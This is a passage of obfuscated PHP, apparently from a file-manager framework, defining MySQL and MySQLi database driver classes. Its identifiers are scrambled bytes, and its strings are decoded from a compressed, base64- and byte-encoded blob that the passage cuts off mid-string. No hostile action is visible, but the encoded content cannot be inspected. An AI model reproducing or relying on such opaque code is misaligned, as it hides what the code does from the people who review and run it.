(!$this->_linkID) { return !1; } $this->queryStr = $×ë±íö; if ($this->queryID) { $this->free(); } think_action_status($‚Õ¢¢Õ·[23], 1); think_status($‚Õ¢¢Õ·[24]); $this->queryID = mysql_query($×ë±íö, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ãˆî‹Ôë) { $è»¡‹÷½ =& $_SERVER[™»È’øè]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ãˆî‹Ôë; if ($this->queryID) { $this->free(); } think_action_status($è»¡‹÷½[25], 1); think_status($è»¡‹÷½[24]); $âŒÎ¹¸… = mysql_query($ãˆî‹Ôë, $this->_linkID); $this->debug(); if (!1 === $âŒÎ¹¸…) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[™»È’øè][924], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $•ÜÂíÔÇ = mysql_query($_SERVER[™»È’øè][925], $this->_linkID); $this->transTimes = 0; if (!$•ÜÂíÔÇ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¾²‹ß´ = mysql_query($_SERVER[™»È’øè][926], $this->_linkID); $this->transTimes = 0; if (!$¾²‹ß´) { $this->error(); return !1; } } return !0; } private function getAll() { $ıŞ¬µÀ« = array(); if ($this->numRows > 0) { while ($¯³»à¶… = mysql_fetch_assoc($this->queryID)) { $ıŞ¬µÀ«[] = $¯³»à¶…; } mysql_data_seek($this->queryID, 0); } return $ıŞ¬µÀ«; } public function getFields($—¥­¼ñÎ) { $µ¢ÒËòŞ =& $_SERVER[™»È’øè]; $†½ÀÌÛµ = $this->query($µ¢ÒËòŞ[927] . $this->parseKey($—¥­¼ñÎ)); $©÷ÉµÒ = array(); if ($†½ÀÌÛµ) { foreach ($†½ÀÌÛµ as $Öü‘ì¶® => $·æö•ô”) { $©÷ÉµÒ[$·æö•ô”[$µ¢ÒËòŞ[31]]] = array($µ¢ÒËòŞ[32] => $·æö•ô”[$µ¢ÒËòŞ[31]], $µ¢ÒËòŞ[33] => $·æö•ô”[$µ¢ÒËòŞ[34]], $µ¢ÒËòŞ[35] => (bool) (strtoupper($·æö•ô”[$µ¢ÒËòŞ[36]]) === $µ¢ÒËòŞ[928]), $µ¢ÒËòŞ[37] => $·æö•ô”[$µ¢ÒËòŞ[38]], $µ¢ÒËòŞ[39] => strtolower($·æö•ô”[$µ¢ÒËòŞ[40]]) == $µ¢ÒËòŞ[41], $µ¢ÒËòŞ[42] => strtolower($·æö•ô”[$µ¢ÒËòŞ[43]]) == $µ¢ÒËòŞ[44]); } } return $©÷ÉµÒ; } public function getTables($Õ®ğ²Â = '') { $ÏâìôÇŞ =& $_SERVER[™»È’øè]; if (!empty($Õ®ğ²Â)) { $ÈØûî…µ = $ÏâìôÇŞ[929] . $Õ®ğ²Â . $ÏâìôÇŞ[930]; } else { $ÈØûî…µ = $ÏâìôÇŞ[931]; } $Øïóøõ = $this->query($ÈØûî…µ); $øèŞ±ñ³ = array(); foreach ($Øïóøõ as $è€³”¢Å => $ï³·ùÚ) { $øèŞ±ñ³[$è€³”¢Å] = current($ï³·ùÚ); } return $øèŞ±ñ³; } public function replace($–ŒºèË, $ø‰«¿«İ = array()) { $ãµÕÖ×Û =& $_SERVER[™»È’øè]; foreach ($–ŒºèË as $É‡ÏäÂ¯ => $â¶ŸŞ€ã) { $ŠìêçŒ¾ = $this->parseValue($â¶ŸŞ€ã); if (is_scalar($ŠìêçŒ¾)) { $Œ€û¸Öî[] = $ŠìêçŒ¾; $ïšı‘ªã[] = $this->parseKey($É‡ÏäÂ¯); } } $µêîÄ¾Å = $ãµÕÖ×Û[932] . $this->parseTable($ø‰«¿«İ[$ãµÕÖ×Û[322]]) . $ãµÕÖ×Û[933] . implode($ãµÕÖ×Û[50], $ïšı‘ªã) . $ãµÕÖ×Û[934] . implode($ãµÕÖ×Û[50], $Œ€û¸Öî) . $ãµÕÖ×Û[935]; return $this->execute($µêîÄ¾Å); } public function insertAll($Ş¤É·¨¾, $©˜ªø¥» = array(), $±ú´«…¿ = false) { $¼ÌÔ»œ =& $_SERVER[™»È’øè]; if (!is_array($Ş¤É·¨¾[0])) { return !1; } $éåøº÷ = array_keys($Ş¤É·¨¾[0]); $èè‰‡Õš = array(); foreach ($Ş¤É·¨¾ as $©Õ¡À¿×) { $ÂÂŸ¨€´ = array(); foreach ($©Õ¡À¿× as $øÚßĞıŞ => $¹ôŒíş”) { $¹ôŒíş” = $this->parseValue($¹ôŒíş”); if (is_scalar($¹ôŒíş”)) { $ÂÂŸ¨€´[] = $¹ôŒíş”; } } $èè‰‡Õš[] = $¼ÌÔ»œ[303] . implode($¼ÌÔ»œ[50], $ÂÂŸ¨€´) . $¼ÌÔ»œ[935]; } array_walk($éåøº÷, array($this, $¼ÌÔ»œ[936])); $øÙ˜‹´ = ($±ú´«…¿ ? $¼ÌÔ»œ[937] : $¼ÌÔ»œ[938]) . $¼ÌÔ»œ[939] . $this->parseTable($©˜ªø¥»[$¼ÌÔ»œ[322]]) . $¼ÌÔ»œ[933] . implode($¼ÌÔ»œ[50], $éåøº÷) . $¼ÌÔ»œ[940] . implode($¼ÌÔ»œ[50], $èè‰‡Õš); return $this->execute($øÙ˜‹´); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $–èå …° =& $_SERVER[™»È’øè]; $this->error = mysql_errno() . $–èå …°[4] . mysql_error($this->_linkID); if ($–èå …°[12] != $this->queryStr) { $this->error .= LNG($–èå …°[48]) . $this->queryStr; } think_trace($this->error, $–èå …°[12], $–èå …°[49]); return $this->error; } public function escapeString($€ñìö) { if ($this->_linkID) { return mysql_real_escape_string($€ñìö, $this->_linkID); } else { return mysql_escape_string($€ñìö); } } public function parseKey(&$ÀŸø€²Ì, $î™ÔÅ²„ = true) { $šÒÛìñº =& $_SERVER[™»È’øè]; if ($î™ÔÅ²„) { $ÀŸø€²Ì = $this->parseKeyCheck($ÀŸø€²Ì); } if ($ÀŸø€²Ì != $šÒÛìñº[202] && !preg_match($šÒÛìñº[941], $ÀŸø€²Ì)) { $ÀŸø€²Ì = $šÒÛìñº[428] . trim($ÀŸø€²Ì, $šÒÛìñº[428]) . $šÒÛìñº[428]; } return $ÀŸø€²Ì; } } class DbMysqli extends Db { public function __construct($€ˆ¶ıµ´ = '') { $Á•å™üÊ =& $_SERVER[™»È’øè]; if (!extension_loaded($Á•å™üÊ[942])) { think_exception(think_lang($Á•å™üÊ[14]) . $Á•å™üÊ[943]); } if (!empty($€ˆ¶ıµ´)) { $this->config = $€ˆ¶ıµ´; if (empty($this->config[$Á•å™üÊ[17]])) { $this->config[$Á•å™üÊ[17]] = $Á•å™üÊ[12]; } } } public function connect($ˆ¯•­Å‘ = '', $Ößš·İû = 0) { $—Ï§ìï¬ =& $_SERVER[™»È’øè]; if (!isset($this->linkID[$Ößš·İû])) { if (empty($ˆ¯•­Å‘)) { $ˆ¯•­Å‘ = $this->config; } $this->linkID[$Ößš·İû] = new mysqli($ˆ¯•­Å‘[$—Ï§ìï¬[916]], $ˆ¯•­Å‘[$—Ï§ìï¬[918]], $ˆ¯•­Å‘[$—Ï§ìï¬[919]], $ˆ¯•­Å‘[$—Ï§ìï¬[21]], $ˆ¯•­Å‘[$—Ï§ìï¬[917]] ? intval($ˆ¯•­Å‘[$—Ï§ìï¬[917]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Âš´†Æ = $this->linkID[$Ößš·İû]->server_version; $this->linkID[$Ößš·İû]->query($—Ï§ìï¬[920] . think_config($—Ï§ìï¬[921]) . $—Ï§ìï¬[58]); if ($Âš´†Æ > $—Ï§ìï¬[922]) { $this->linkID[$Ößš·İû]->query($—Ï§ìï¬[923]); } $this->connected = !0; if (1 != think_config($—Ï§ìï¬[22])) { unset($this->config); } } return $this->linkID[$Ößš·İû]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($®û§ìî) { $Ş¶Ë¸é« =& $_SERVER[™»È’øè]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $®û§ìî; if ($this->queryID) { $this->free(); } think_action_status($Ş¶Ë¸é«[23], 1); think_status($Ş¶Ë¸é«[24]); $this->queryID = $this->_linkID->query($®û§ìî); if ($this->_linkID->more_results()) { while (($ç±šÏ¡£ = $this->_linkID->next_result()) != NULL) { $ç±šÏ¡£->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($»‰œœôë) { $»ú‰©âï =& $_SERVER[™»È’øè]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $»‰œœôë; if ($this->queryID) { $this->free(); } think_action_status($»ú‰©âï[25], 1); think_status($»ú‰©âï[24]); $æè±ò½Ê = $this->_linkID->query($»‰œœôë); $this->debug(); if (!1 === $æè±ò½Ê) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $·±ô´å = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$·±ô´å) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $™¶À¿µ‡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$™¶À¿µ‡) { $this->error(); return !1; } } return !0; } private function getAll() { $˜Ò‹¦¿ô = array(); if ($this->numRows > 0) { for ($ÙĞØÅâ× = 0; $ÙĞØÅâ× < $this->numRows; $ÙĞØÅâ×++) { $˜Ò‹¦¿ô[$ÙĞØÅâ×] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $˜Ò‹¦¿ô; } public function getFields($›È¿Çô ) { $¢ô¢«Ö¢ =& $_SERVER[™»È’øè]; $Åıš¨ë = $this->query($¢ô¢«Ö¢[927] . $this->parseKey($›È¿Çô )); $¡’Ü›ë = array(); if ($Åıš¨ë) { foreach ($Åıš¨ë as $™½õîÌ => $‘‡º°ÜÅ) { $¡’Ü›ë[$‘‡º°ÜÅ[$¢ô¢«Ö¢[31]]] = array($¢ô¢«Ö¢[32] => $‘‡º°ÜÅ[$¢ô¢«Ö¢[31]], $¢ô¢«Ö¢[33] => $‘‡º°ÜÅ[$¢ô¢«Ö¢[34]], $¢ô¢«Ö¢[35] => (bool) ($‘‡º°ÜÅ[$¢ô¢«Ö¢[36]] === $¢ô¢«Ö¢[12]), $¢ô¢«Ö¢[37] => $‘‡º°ÜÅ[$¢ô¢«Ö¢[38]], $¢ô¢«Ö¢[39] => strtolower($‘‡º°ÜÅ[$¢ô¢«Ö¢[40]]) == $¢ô¢«Ö¢[41], $¢ô¢«Ö¢[42] => strtolower($‘‡º°ÜÅ[$¢ô¢«Ö¢[43]]) == $¢ô¢«Ö¢[44]); } } return $¡’Ü›ë; } public function getTables($™šĞéµı = '') { $ÀïëÓÙÉ =& $_SERVER[™»È’øè]; $ÁÇ ° = !empty($™šĞéµı) ? $ÀïëÓÙÉ[929] . $™šĞéµı . $ÀïëÓÙÉ[930] : $ÀïëÓÙÉ[931]; $àØÌ“ÈË = $this->query($ÁÇ °); $‰§ç…ÃÙ = array(); if ($àØÌ“ÈË) { foreach ($àØÌ“ÈË as $»ô€áîÙ => $Ì›¨óİá) { $‰§ç…ÃÙ[$»ô€áîÙ] = current($Ì›¨óİá); } } return $‰§ç…ÃÙ; } public function replace($—†ªÇ”®, $¨Á”®èí = array()) { $º¬”ÛåĞ =& $_SERVER[™»È’øè]; foreach ($—†ªÇ”® as $æ–Åí‡ => $Ü©÷­¡) { $ø›–ËîÉ = $this->parseValue($Ü©÷­¡); if (is_scalar($ø›–ËîÉ)) { $«‡Úæ®¤[] = $ø›–ËîÉ; $˜¢ê·[] = $this->parseKey($æ–Åí‡); } } $Úó§Ô™ = $º¬”ÛåĞ[932] . $this->parseTable($¨Á”®èí[$º¬”ÛåĞ[322]]) . $º¬”ÛåĞ[933] . implode($º¬”ÛåĞ[50], $˜¢ê·) . $º¬”ÛåĞ[934] . implode($º¬”ÛåĞ[50], $«‡Úæ®¤) . $º¬”ÛåĞ[935]; return $this->execute($Úó§Ô™); } public function insertAll($ô¸¿à‚Ò, $åšúŠØÌ = array(), $ÇŞöİ‰³ = false) { $¿ˆÆÂ•Í =& $_SERVER[™»È’øè]; if (!is_array($ô¸¿à‚Ò[0])) { return !1; } $©²ş’¨Š = array_keys($ô¸¿à‚Ò[0]); $àüØ“© = array(); foreach ($ô¸¿à‚Ò as $âÑğ‹ÉÜ) { $›ÃšÌ¾– = array(); foreach ($âÑğ‹ÉÜ as $èñ²¹œ˜ => $±Ÿñí£) { $±Ÿñí£ = $this->parseValue($±Ÿñí£); if (is_scalar($±Ÿñí£)) { $›ÃšÌ¾–[] = $±Ÿñí£; } } $àüØ“©[] = $¿ˆÆÂ•Í[303] . implode($¿ˆÆÂ•Í[50], $›ÃšÌ¾–) . $¿ˆÆÂ•Í[935]; } array_walk($©²ş’¨Š, array($this, $¿ˆÆÂ•Í[936])); $’¨ºÆ¶ú = $ÇŞöİ‰³ ? $¿ˆÆÂ•Í[937] : $¿ˆÆÂ•Í[938]; $ĞÚ¿¨á¢ = $’¨ºÆ¶ú . $¿ˆÆÂ•Í[939] . $this->parseTable($åšúŠØÌ[$¿ˆÆÂ•Í[322]]) . $¿ˆÆÂ•Í[933] . implode($¿ˆÆÂ•Í[50], $©²ş’¨Š) . $¿ˆÆÂ•Í[940] . implode($¿ˆÆÂ•Í[50], $àüØ“©); return $this->execute($ĞÚ¿¨á¢); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $·íÎ‹½  =& $_SERVER[™»È’øè]; $this->error = $this->_linkID->errno . $·íÎ‹½ [4] . $this->_linkID->error; if ($·íÎ‹½ [12] != $this->queryStr) { $this->error .= LNG($·íÎ‹½ [48]) . $this->queryStr; } think_trace($this->error, $·íÎ‹½ [12], $·íÎ‹½ [49]); return $this->error; } public function escapeString($™æÅÈ¦) { if ($this->_linkID) { return $this->_linkID->real_escape_string($™æÅÈ¦); } else { return addslashes($™æÅÈ¦); } } public function parseKey(&$îàüµÔĞ, $ˆ±‡ç£€ = true) { $ˆ¦ÃÅ“ß =& $_SERVER[™»È’øè]; if ($ˆ±‡ç£€) { $îàüµÔĞ = $this->parseKeyCheck($îàüµÔĞ); } if ($îàüµÔĞ != $ˆ¦ÃÅ“ß[202] && !preg_match($ˆ¦ÃÅ“ß[941], $îàüµÔĞ)) { $îàüµÔĞ = $ˆ¦ÃÅ“ß[428] . trim($îàüµÔĞ, $ˆ¦ÃÅ“ß[428]) . $ˆ¦ÃÅ“ß[428]; } return $îàüµÔĞ; } } goto d‚ŠñÀÃ…í; C¡¶ß²£Ì·: define($_SERVER[™»È’øè][281], 1); define($_SERVER[™»È’øè][282], 2); define($_SERVER[™»È’øè][283], 3); goto C¶¬‡¼°«; b¼°ˆÏ² –: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\x99\xbb\xc8\x92\xf8\xe8", "\242\301\201\357\312\343"); $_SERVER[™»È’øè] = explode(strrev('|||'), gzinflate(substr(strrev('k6vËœ’2Y±ËlŒq8îv¶$1t/–”¡I¾á8õÅ|	½Å'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹')."\151\145\255\55\151\25\355\312\127\222\162\103\271\302\131\356\226\266\20\240\55\44\4\312\115\110\113\71\112\71\13\205\102\41\120\50\11\241\20\50\264\244\24\50\374\346\170\163\354"."\112\206\357\377\363\377\175\76\277\100\242\231\67\307\316\361\346\315\233\67\357\275\371\375\366\215\67\157\333\261\166\357\265\23\326\356\271\171\343\265\237\275\167\6\15\243\377\366\131"."\xbb\x17\xd\x7f\xff\xfc\xfd\xf7\x20\x7f\x8e\x38\xff\xbc\x9a\x9a\xf6\x59\x7\x4e\x8d\x1c\x7c\xd1\xaf\x6f\xd3\x6e\xd5\x6e\xd3\xd6\x47\xc3\x4f\x3e\x15\x3a\xe4\x99\x5b\x17\x5\x77\xdc\xf0\xe4\xe8\x8e"."\75\367\270\242\361\167\157\65\240\314\264\154\3\375\121\362\246\255\350\43\206\145\133\24\220\64\363\151\243\237\206\215\74\375\365\323\237\256\130\270\250\347\114\133\247\121\37\375\121".base64_decode('oV3kX2t11mDpaiSaUONdnZ3BWAIyNcjpOTMFoYJW1HLw/YJetFBr5OrUglnQ8w6IAA==')."\244\64\133\353\323\54\250\251\265\131\155\15\166\206\243\313\325\304\362\316\40\344\350\123\127\227\364\342\50\215\221\140\334\326\212\166\302\310\351\74\307\160\221\267\253\71\270\60\24"."\121\22\261\100\44\36\150\111\204\242\21\12\156\211\166\164\204\22\345\360\130\64\34\156\16\264\54\56\117\351\214\5\26\166\4\24\324\276\254\256\32\371\264\131\243\254\242\51\253".base64_decode('lFoaaDP0bIoG8xprjj1agFCCh9A05UvZLI1EeCilp7VSFkarVY4UikZOY51erI9yKA==')."\xd\x68\x25\xdb\x34\xf2\x49\x1a\x9\x8e\xd8\x45\x4d\xc0\x51\x5b\x93\x68\xa2\xf5\x3c\x54\x15\xf\x86\x83\x2d\x9\x5\x37\x50\x69\x8b\x45\x3b\x14\x98\x84\x9c\x66\xd9\x7a\x51\x59\xda\x1e\x8c\x5\x15"."\xdc\xe8\xc6\x6a\xd2\xd7\x6a\x5\xf0\x25\x82\x86\x42\x9\x84\xc3\xca\x78\x35\xd8\x7a\xae\xc0\xaa\xa1\x65\x2a\x54\x16\x8d\xb5\x6\x63\x4a\xf3\x72\x45\x8c\x50\xd2\xcc\xe5\xcc\xbc\xf\xd5\x82\x66\xd2".strrev('M~á«H:hb[-!Õµ*XŸ€é’ÔaÉÜè1ä-­´HƒIáèÀhÅŒš–')."\xb\x50\x77\xb5\x91\x37\x4a\x80\xa6\x50\x85\x69\xf2\x65\x5\x81\x12\xcb\xad\x33\x88\x9e\x82\x40\xe\x95\x37\x61\xe5\xa1\x65\x38\x44\x83\x8d\xb\xe8\xef\x3c\xc8\xd4\xa7\xe2\x34\xbd\x68\xab\x7a\x3e"."\x69\xa6\x8c\x3c\x2c\xd6\x26\x40\x3a\xcd\xce\xb4\x16\xd\x94\x81\xc6\xd3\x66\x36\xc5\xc2\x96\x31\x6\x5d\x49\x1b\x59\x3d\x52\xca\xc9\x59\x78\x34\x99\x31\xb2\xa9\x22\x5b\x5f\x5f\x97\x93\x46\xc3\x7c".strrev('×y®*ZšÈUÙ†60s¨Ûn°¯­z“,ËTòuó†õŠHİ+á-@V"¼â¹')."\263\15\125\24\55\331\62\260\104\262\265\231\305\134\53\242\14\360\175\264\52\214\256\12\11\203\154\135\244\244\21\363\327\164\237\346\375\262\267\373\44\364\117\55\220\276\36\150\123"."\106\317\146\125\175\104\207\205\223\113\315\264\330\140\370\255\76\43\357\107\20\32\15\105\325\214\146\145\72\122\63\125\122\212\121\324\224\76\342\53\144\12\260\252\371\102\356\161\40"."\x36\x1e\xba\x88\x69\x7\x25\xba\x9c\x35\x93\x5a\x56\xee\x22\xd\x67\x6c\xbb\x10\xd7\xf3\x29\x3c\x12\xd0\x15\x73\x38\x4f\x46\xaa\xa0\xeb\x90\xa9\xd5\xa3\xa4\x94\xe\x65\xb9\xd2\xde\x60\x34\x58\xac"."\x60\x2e\xcb\x43\xac\x77\x1c\x66\x71\xa0\x3d\xc2\xa6\x33\x95\xa6\x81\x3e\xb6\x2d\x54\xc1\x7\xd\x8b\x50\x38\xb1\x3c\xb5\x42\x21\x6b\x24\x35\xdb\x30\xf3\x7e\x33\x69\xeb\xb6\xd7\xb2\x8b\xba\x6\x35"."\6\222\111\335\262\274\55\146\336\56\232\131\157\40\233\65\207\275\321\242\321\157\344\33\224\51\100\154\121\42\132\324\136\114\0\33\140\245\126\315\123\60\342\340\317\114\151\54\331"."\x69\xef\x1c\xb6\x2\x79\xee\xa2\x96\xb7\xd2\x7a\xd1\x1b\x84\x95\xd1\xa0\xa0\xc6\x72\x2a\xc8\xb2\xb5\x1a\x56\xc1\xb4\xc\xdc\xbc\x6\x45\xb3\x6d\x2d\x99\xc1\x14\x44\x54\xdf\xf8\x35\xf9\x8d\x7c\xd6".base64_decode('yOtleYMjBaOoW6ytysKOBFSCate9nUWtP6c1KIVSHxoZWKkVYDQ3DE2DksRRj5IrWQ==').base64_decode('treoI1JkoO0OBjmU9nbgdWXoKW8cUWwAT6+boSDUUVgahbYnEp1qqA1tyZGg2hFItA==')."\264\103\263\155\255\237\265\71\214\350\60\257\222\1\227\171\321\372\302\310\25\101\175\25\300\116\163\130\57\242\17\67\217\66\50\203\146\252\317\34\361\261\44\234\71\216\10\15\313"."\x8c\xa7\xbb\x60\x7b\x63\x5a\xbe\x1f\x8f\x4f\xdf\xa8\xad\x3\xa\x5a\x43\xfd\xce\x81\xe\xeb\xf9\x7e\x3b\xc3\xa\xc6\x83\xb1\x25\xc1\x98\x1a\x8f\xb6\x25\x96\x6\x62\xb0\x99\xe7\x11\x96\x8c\xb0\x4f".base64_decode('4aqz3pieQkOftFk5rYBHjeXBiwPPFUvFC4alhUML8cC0ei2UySvnYnWHjZyB227zFA==')."\62\222\150\247\137\10\15\362\223\16\65\366\130\123\152\172\122\123\153\275\350\337\51\265\335\75\255\276\51\275\115\176\103\224\361\327\373\352\225\151\165\263\224\116\304\172\30\132\126"."\201\116\227\345\250\123\242\213\235\303\42\260\71\157\346\365\257\31\34\274\167\111\313\336\65\254\24\30\13\236\334\25\214\47\324\216\140\242\75\332\12\137\17\6\40\24\66\351\262"."\x65\xbd\xed\xa6\x3f\xbd\x30\xbb\xbd\xf4\x47\x35\xac\x36\x69\x5b\xc1\x51\x4e\x7e\x54\xb3\x6f\x0\x4d\x46\x87\xce\x68\x6c\x9a\xd2\xe8\x50\x4e\xeb\x97\x88\xbc\xea\xdc\x3\x70\xc\x27\x76\x98\x45\x5d"."\xec\x55\x4b\x8d\x14\xdf\x24\x50\xb4\x5d\x37\xfa\x33\x30\x60\x6\xae\x2e\x69\x66\xcd\xa2\x96\xc5\xa4\x91\xad\xa\x9d\x91\xab\x7e\x3\xc8\x55\x21\x5b\x42\x38\xe3\xc7\x5f\x48\x64\x4a\xb9\x3e\xa0\xe8"."\210\3\354\327\155\301\140\131\243\210\13\311\261\235\13\155\177\166\250\325\261\77\101\314\257\342\171\356\361\25\362\375\265\47\102\135\352\264\231\165\30\0\50\12\135\104\234\146\111"."\x2f\x1f\x3\x5f\xd2\x44\x5b\x4d\x87\x36\xa8\x37\xe0\x4e\x1\xfd\x98\x47\xa0\x2c\x22\x11\x96\x79\x78\x2f\x68\x74\xef\xed\x78\x9e\xb2\xbe\x1c\xaa\x84\xd4\xd9\x62\xf2\xdd\x8b\xf2\xf2\xf3\x9c\x7b\x81"."\xa2\x17\x8b\x66\xf1\x78\xc8\x41\xc2\xa\xd9\x50\xf0\xbc\x41\xe5\x36\xdf\x9e\x2d\xb4\x7c\x58\x38\x63\xf2\xed\xdc\x2c\x42\xa8\xc1\xf\xfd\x9e\x34\xad\x8d\x6d\x76\xfe\xf8\x74\xf4\xbf\xd8\xd9\x52\x66"."\116\143\373\4\241\360\172\212\222\170\12\232\342\110\151\327\65\301\243\330\105\333\304\320\242\43\13\302\247\214\11\170\215\346\15\232\124\342\155\143\255\114\351\131\235\341\102\106\147".base64_decode('u2QdZENjxzElzVEWMbsIKtgTw4qhknhPY/Gl+HQgAHhjh5kXwSwa9yjBfRHvLOppAw==')."\xc8\x55\x1e\xa1\x66\x87\x56\x1c\x64\x1d\x43\x25\xc5\xaa\xc1\x11\x69\x45\xb5\x75\x85\xc3\x6a\x4b\x34\x92\x40\x87\xb\xa\x59\x1a\xb\x25\x82\x6c\x5\x7\x5a\xd5\x40\x4b\x27\x67\x41\x0\x8c\x9\x6c"."\371\356\111\41\103\323\140\222\121\43\374\142\233\107\73\126\301\314\133\272\67\11\45\304\321\243\54\51\45\166\101\240\263\142\347\164\155\206\43\136\55\67\346\315\41\22\340\345\315"."\x73\xf2\x20\xa\xec\x8e\x94\x95\x9\xc1\x34\x89\xcd\xd\xf\x1e\x5a\x85\x8c\xf9\xe9\x8c\xc6\xa1\x40\x13\x86\x22\x6\xb4\x8f\x2f\x96\xce\x2e\x48\xca\x49\x28\xb2\x30\x8\xc0\x3\x1\xab\x32\x1a\xb0"."\x95\x81\xa5\x71\xb6\x31\x95\x50\xfe\xa2\x31\xa6\x89\x2e\x35\xb1\xf6\xb0\x8e\xe4\xb2\x82\x9f\x75\xf6\xca\x2b\x66\x1e\x55\x39\xc3\xdb\xde\x11\x68\xf1\xc6\xdb\x3\xd3\x66\xce\xa2\xd0\xe5\xb9\x54\x4f"."\242\335\260\172\126\360\70\214\333\260\65\103\55\352\210\74\260\232\247\325\325\263\305\213\270\10\251\75\313\275\71\57\256\5\17\231\257\256\256\216\325\65\165\226\222\101\124\11\320"."\xd7\xcc\xa7\xc8\xb4\xc0\x60\xf5\x95\x92\x83\x6c\x85\x68\x49\xc6\xd0\xe1\x13\xaf\xe5\x1d\x36\x18\x41\x3d\x91\xf3\xbe\x27\x96\xa3\xcb\x89\xce\xad\x3\xaa\x28\x11\xc6\x4d\xd5\x92\xf8\x63\x2a\xaa\xd1"._kodDe('Kk0ixOZplDaIAHmbupxG4YqXO1tgJmbARIEoiN/WcbmHBTthg9GZoYC4b4EtIaZGrw8=')."\226\125\152\303\62\127\33\226\225\267\201\202\54\243\77\217\172\311\366\244\104\173\50\262\130\355\210\266\6\303\152\50\202\266\340\104\71\274\253\263\65\300\126\252\14\157\216\46\332"."\35\320\56\264\11\57\11\204\103\356\354\301\145\241\170\42\136\61\11\301\272\202\256\224\326\146\265\63\26\154\13\55\343\321\266\120\60\334\32\127\133\2\55\355\42\117\44\320\21"."\xe4\x3b\xaf\x9e\x4d\x59\x7e\x67\x7e\x15\x71\x13\x71\x2e\xb9\x50\x87\xb0\x14\x86\x61\xa1\xea\x10\x16\xa8\xec\x18\xac\xa\x62\x81\xb8\x46\x1d\x6\x1c\xba\x8b\x65\x3f\xa4\x27\x2a\x43\xd2\x12\xe3\x75".strrev('¨ÃœÓÖiçÖSg'."\0".'¯¾­£‹é ò÷îœ¨.ÅqU©ı'."\r".'acR4œƒvÇ)‰ø').strrev('!dh±¥Ô‡‹'."\0".'XÁ£Qà!i9¬´Yš c>f@˜Bd"44‰Êˆâ¸×Îm¤')."\x18\xce\xe8\xac\x1\x21\x18\xfe\x1a\x76\x8a\x0\x29\x91\x2d\xb6\x1e\x74\x4\xd0\x98\xb8\x40\xc\xfa\x80\xc9\x86\x72\x2d\xfd\x99\xc\xa4\x0\x9d\x37\x81\xb2\xe4\xd9\xa8\xf7\xe1\x5d\x98\x71\x51\x2c".base64_decode('kEZkj+2gZol/rc80s4wgI0aY7wxcyjRgMSQZYXvKVE7KAHWji4MRlWEWjUnYSAHBWA==')."\x2c\x1a\x83\x1\xb1\xcd\x41\x26\x7c\xa0\x89\xb1\x60\x9c\x91\x73\x4c\x36\xd\x36\x5c\x7e\xdf\x54\xc0\x62\x1d\x31\x1b\xf0\x79\xff\xca\x9e\xe1\xa9\x35\xdd\xde\xa9\xbe\x5e\x14\xa8\x9d\x72\x12\x8d\x42"."\254\307\347\210\62\6\256\124\344\245\361\371\240\306\152\252\155\350\361\367\370\153\232\32\272\3\336\61\315\73\126\347\235\353\355\105\154\137\355\124\0\364\256\231\346\231\261\16\147".strrev(''."\r".'jjjj(Ég,“¾ÄÛRîèNø÷Ç©†êŞî¤ê°“¼z“M=?EèN›@')."\x6a\x12\x3a\x37\xf0\x2c\x79\xb2\xb7\x49\x19\x58\xc2\x98\x51\x10\xd0\x35\xb3\xd6\x31\x38\x9a\x43\xbd\x5f\x94\xe8\xf6\xf6\x4c\xed\x6d\x92\xca\x49\x20\xf7\xb7\x10\x25\x45\x1b\x6d\x86\xe7\xb\x78\x57"."\xe0\x9e\xf1\xa2\x78\xdd\x3\x7e\x94\xf2\x49\xb1\x2d\xe1\x75\xd1\xa7\x25\x81\xe\x20\x1a\x29\xb8\x76\xbb\xc8\x5\x52\xce\xe3\xea\x9a\x49\xf4\x77\x1d\x9b\xc8\x7e\x7d\x84\xef\x5f\x69\xa3\x8\xd8\x59"."\312\33\253\31\327\234\327\127\103\300\264\31\176\367\351\366\260\316\320\3\301\35\161\204\34\214\356\243\44\51\226\225\366\14\42\71\220\266\133\306\344\25\124\174\222\30\346\61\264"."\x8d\xc0\x3c\x1d\x0\xb9\xad\xa4\x56\xd0\xe3\x52\xf\x55\x35\x11\x68\xe\x7\x55\x46\x61\x80\x12\xb3\x38\xa1\x8a\xcd\x5c\x36\x8d\xba\x26\x28\x2a\xa3\xf\x49\x71\x56\x25\xc7\x72\x58\xf9\xd6\xea\xac"."\x42\x8\x3\xe5\xdc\x1b\x88\x98\xde\x2a\x15\x30\x13\xae\xa0\x19\x47\x63\xab\xa0\xd\x5c\x69\x5c\xa